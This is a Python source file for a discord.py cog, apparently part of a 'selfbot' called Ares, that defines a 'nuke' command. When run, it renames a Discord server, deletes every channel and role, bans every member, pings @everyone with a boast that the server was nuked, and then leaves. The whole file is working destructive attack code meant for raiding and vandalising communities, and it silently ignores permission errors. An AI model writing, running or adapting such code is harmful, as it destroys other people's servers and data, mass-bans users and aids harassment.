from discord import Forbidden, HTTPException
from discord.ext import commands

class Nuke(commands.Cog):
    def __init__(self, client):
        self.client = client

    @commands.command()
    async def nuke(self, ctx):
        try:
            await ctx.guild.edit(
                name="✯ Ares ✯",
                description="Nuked using Ares SelfBot"
            )
        except Forbidden:
            pass
        for channel in ctx.guild.channels:
            try:
                await channel.delete()
            except Forbidden:
                pass
        for member in ctx.guild.members:
            try:
                await member.ban()
            except Forbidden:
                pass
        for role in ctx.guild.roles:
            try:
                await role.delete()
            except (Forbidden, HTTPException):
                pass
        channel = await ctx.guild.create_text_channel("✯ Ares ✯")
        message = await channel.send("@everyone")
        await message.delete()
        await channel.send("This Discord has just been Nuked using Ares SelfBot!")
        await ctx.guild.leave()


def setup(client):
    client.add_cog(Nuke(client))
